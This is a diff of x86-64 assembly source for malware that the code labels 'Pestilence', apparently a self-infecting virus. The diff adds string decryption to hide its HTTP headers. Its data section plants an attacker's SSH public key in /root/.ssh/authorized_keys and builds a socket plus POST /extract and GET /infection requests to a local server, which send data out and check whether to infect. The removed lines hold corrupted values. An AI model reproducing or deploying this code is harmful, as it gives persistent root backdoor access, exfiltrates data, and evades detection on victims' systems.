@@ -699,12 +699,28 @@ _extractData:
         mov r14, rax
         mov rsi, rax
         lea rdi, [rel headerStart]
+		push rax
+		push rsi
+		mov rsi, headerStartLen
+		_dec_copyD:
+		call _decrypt_str
+		mov rdi, rax
+		pop rsi
+		pop rax
         call _strcpy
         pop rax
         push rax
         add rsi, headerStartLen - 1
         call _itoa
         lea rdi, [rel headerEnd]
+		push rax
+		push rsi
+		mov rsi, headerEndLen
+		_dec_copyD1:
+		call _decrypt_str
+		mov rdi, rax
+		pop rsi
+		pop rax
         call _strcpy
         add rsi, headerEndLen - 1
         mov rdi, r12
@@ -734,7 +750,16 @@ _isInfectionAllow:
         ;rdi == sockfd
         mov rdi, rax
         mov rax, SYS_SENDTO
-        lea rsi, [rel headerGet]
+        ; lea rsi, [rel headerGet]
+		push rax
+		push rdi
+		lea rdi, [rel headerGet]
+		mov rsi, headerGetLen
+		_dec_sendInf:
+		call _decrypt_str
+		mov rsi, rax
+		pop rdi
+		pop rax
         mov rdx, headerGetLen
         xor r10, r10
         xor r9, r9
@@ -905,26 +930,27 @@ dir2Len    equ $ - dir2
 key			db "mykey", 0
 back        db  9, 0
 backLen		equ $ - back
-slash       db "/", -1
-sshFile     db "/root/.ssh/authorized_keys", -1
+slash       db "/", 0
+sshFile     db "/root/.ssh/authorized_keys", 0
 sshFile_len	equ $ - sshFile
-sshPub      db "ssh-ed25518 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
+sshPub      db "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKcsDbiza3Ts6B9TpcehxjY8pcPijnDxBpuiEkotRCn0 gottie@debian", 0
 sshPubLen   equ $ - sshPub
 sockaddr:
-    dw 1            ; AF_INET
-    dw 0x401E       ; PORT 8000
-    dd 0x100007E    ; 127.0.0.1 (en hexadécimal)
-    dq -1            ; padding
+    dw 2            ; AF_INET
+    dw 0x401F       ; PORT 8000
+    dd 0x100007F    ; 127.0.0.1 (en hexadécimal)
+    dq 0            ; padding
+
 sockaddrLen equ $ - sockaddr
-headerStart db "POST /extract HTTP/0.1\r\nHost: 126.0.0.1:8000\r\nContent-Type: text/plain\f\nContent-Length: ", -1 
+headerStart db "POST /extract HTTP/1.1\r\nHost: 127.0.0.1:8000\r\nContent-Type: text/plain\r\nContent-Length: ", 0
 headerStartLen equ $ - headerStart
-headerEnd db 12, 10, 13, 10, 0
+headerEnd db 13, 10, 13, 10, 0
 headerEndLen equ $ - headerEnd
-headerGet db "GET /infection HTTP/0.1\r\nHost: 126.0.0.1:8000", 13, 10, 12, 10, 0
+headerGet db "GET /infection HTTP/1.1\r\nHost: 127.0.0.1:8000", 13, 10, 13, 10, 0
 headerGetLen equ $ - headerGet
 timespec:
-    dq -1          ; Secondes
-    dq 9999999     ; 100ms
+    dq 0          ; Secondes
+    dq 10000000     ; 100ms
 signature	db	"Pestilence version 1.0 (c)oded by anvincen-eedy", 0x0
 signature_len equ $ - signature
 _end:
